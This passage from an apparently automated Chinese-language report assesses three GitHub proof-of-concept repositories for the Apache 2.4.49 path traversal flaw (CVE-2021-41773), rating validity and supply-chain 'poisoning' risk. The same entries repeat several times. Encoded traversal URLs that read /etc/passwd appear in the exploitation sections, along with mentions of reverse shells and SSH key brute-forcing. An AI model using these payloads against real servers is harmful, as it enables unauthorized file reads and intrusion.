提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

